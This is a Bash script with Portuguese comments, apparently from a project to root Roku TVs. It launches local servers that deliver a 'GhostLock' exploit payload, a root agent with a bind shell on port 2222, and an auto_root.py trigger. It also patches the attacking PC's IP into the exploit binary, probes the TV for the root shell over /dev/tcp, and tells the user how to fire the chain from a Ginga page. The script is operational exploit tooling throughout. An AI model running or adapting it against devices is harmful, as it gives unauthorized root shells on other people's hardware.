#!/usr/bin/env bash
# start_servers.sh - sobe (ou conserta) os servidores do root da TV.
#
#   bash start_servers.sh          # sobe o que falta, mantem o que esta certo
#   bash start_servers.sh --force  # reinicia tudo (inclusive auto_root)
#
# Servidores:
#   47127  agent8.rld      (agente uid=500 carregado pela pagina Ginga)
#   47190  gx_bind.rld     (exploit GhostLock + bindsh 2222)
#   47192  rootagent7      (agente root com bindsh, ELF cru)
#   47193  miragemd.arm    (servidor local do gerenciador, porta 8090)
#   47140  auto_root.py    (dispara o exploit quando o agente conecta)
set -u

DIR="${ROKU_STATE_DIR:-/tmp/opencode}"
TV="${ROKU_HOST:-192.168.1.100}"
TARGET="${ROKU_TARGET:-}"
REPO="${MIRAGEM_REPO:-$(cd "$(dirname "$0")/.." 2>/dev/null && pwd)}"
PAY="$REPO/payload/$TARGET"
PC_IP="${ROKU_PC_IP:-}"
FORCE=0
[ "${1:-}" = "--force" ] || [ "${1:-}" = "-f" ] && FORCE=1

mkdir -p "$DIR" 2>/dev/null
cd "$DIR" 2>/dev/null || { echo "start_servers: diretorio $DIR nao existe"; exit 1; }

log() { printf '[%s] %s\n' "$(date +%H:%M:%S)" "$*"; }

port_pid() {  # $1 = porta
    ss -lntp 2>/dev/null | awk -v p=":$1" '$4 ~ (p "$")' \
        | sed -n 's/.*pid=\([0-9]*\).*/\1/p' | head -1
}

pick() {  # $1 = nome no payload/<target>/, $2 = fallback no DIR
    if [ -n "$TARGET" ] && [ -f "$PAY/$1" ]; then printf '%s' "$PAY/$1"; else printf '%s' "$DIR/$2"; fi
}

# gx_bind.rld e compilado com HOST_IP. O payload publicado usa o placeholder
# 255.255.255.255 e recebe o IP do PC aqui (mesmo tamanho, so a string muda).
patch_ip() {  # $1 = origem, $2 = destino, $3 = ip
    python3 - "$1" "$2" "$3" <<'PY'
import sys
src, dst, ip = sys.argv[1], sys.argv[2], sys.argv[3]
d = open(src, 'rb').read()
ph = b'255.255.255.255'
if ph not in d:
    open(dst, 'wb').write(d)
    sys.exit(0)
open(dst, 'wb').write(d.replace(ph, ip.encode('ascii') + b'\x00' * (len(ph) - len(ip))))
PY
}

root_up() {  # shell root na TV?
    timeout 2 bash -c "echo > /dev/tcp/$TV/2222" 2>/dev/null
}

serve() {  # $1 = porta, $2 = arquivo
    local port="$1" file="$2" pid cmd
    if [ ! -f "$file" ]; then
        log "ERRO: $file nao existe em $DIR"
        return 1
    fi
    pid="$(port_pid "$port")"
    if [ -n "$pid" ] && [ "$FORCE" = 0 ]; then
        cmd="$(tr '\0' ' ' <"/proc/$pid/cmdline" 2>/dev/null)"
        case "$cmd" in
            *"$file"*) log "porta $port OK  ($file, pid $pid)"; return 0 ;;
        esac
        log "porta $port com arquivo errado (pid $pid: ${cmd% }) -> reiniciando"
    elif [ -n "$pid" ]; then
        log "porta $port: reiniciando a pedido (--force)"
    fi
    [ -n "${pid:-}" ] && { kill "$pid" 2>/dev/null; sleep 0.7; }
    nohup python3 -u srvrld_multi.py "$port" "$file" >"srv_$port.log" 2>&1 &
    sleep 0.6
    pid="$(port_pid "$port")"
    if [ -n "$pid" ]; then
        log "porta $port -> $file (pid $pid)"
    else
        log "ERRO: porta $port nao subiu (veja $DIR/srv_$port.log)"
        return 1
    fi
}

start_auto() {
    local pid cmd
    pid="$(port_pid 47140)"
    if [ -n "$pid" ] && [ "$FORCE" = 0 ]; then
        cmd="$(tr '\0' ' ' <"/proc/$pid/cmdline" 2>/dev/null)"
        case "$cmd" in
            *auto_root.py*)
                # processo certo, mas o flag interno "ran" pode estar travado
                log "auto_root reiniciando para zerar o flag (pid $pid)"
                kill "$pid" 2>/dev/null
                sleep 0.7
                ;;
            *)
                log "porta 47140 ocupada por outro processo (pid $pid) -> reiniciando"
                kill "$pid" 2>/dev/null
                sleep 0.7
                ;;
        esac
    elif [ -n "$pid" ]; then
        kill "$pid" 2>/dev/null
        sleep 0.7
    fi
    rm -f root_shell_up
    nohup python3 -u auto_root.py >auto_root.log 2>&1 &
    sleep 0.7
    pid="$(port_pid 47140)"
    if [ -n "$pid" ]; then
        log "porta 47140 -> auto_root.py (pid $pid)"
    else
        log "ERRO: auto_root nao subiu (veja $DIR/auto_root.log)"
        return 1
    fi
}

echo "=== Roku root: servidores ($DIR) ==="
if [ -n "$TARGET" ]; then
    echo "alvo: $TARGET ($PAY)"
    [ -d "$PAY" ] || echo "AVISO: $PAY nao existe; usando os arquivos de $DIR"
fi
if [ -z "$PC_IP" ]; then
    PC_IP="$(ip route get "$TV" 2>/dev/null | sed -n 's/.* src \([0-9.]*\).*/\1/p' | head -1)"
fi
GB="$(pick gx_bind.rld gx_bind.rld)"
if [ -n "$PC_IP" ] && [ -f "$GB" ]; then
    patch_ip "$GB" "$DIR/gx_bind.served.rld" "$PC_IP" && GB="$DIR/gx_bind.served.rld"
    echo "gx_bind: IP do PC = $PC_IP"
elif [ -f "$GB" ]; then
    echo "AVISO: IP do PC nao detectado; use ROKU_PC_IP=192.168.1.2"
fi
serve 47127 "$(pick agent8.rld agent8.rld)"
serve 47190 "$GB"
serve 47192 "$(pick rootagent7 rootagent7)"
MG="$(pick miragemd.arm miragem_new/miragemd.arm)"
[ -f "$MG" ] || MG="$REPO/tools/miragemd.arm"
serve 47193 "$MG"
if [ "$FORCE" = 1 ]; then
    start_auto
elif root_up; then
    log "2222 ja aberta na TV ($TV) - root no ar, auto_root nao precisa rodar"
else
    log "2222 fechada - preparando o auto_root para o proximo OK na TV"
    start_auto
fi

echo
if root_up; then
    echo "PRONTO: shell root ativo em $TV:2222 (use tvsh)."
else
    echo "PRONTO: servidores no ar. Na TV: abra a pagina GINGA LAB (Antena TV)"
    echo "        e aperte OK no controle; em ~20-30 s o shell root sobe na 2222."
fi
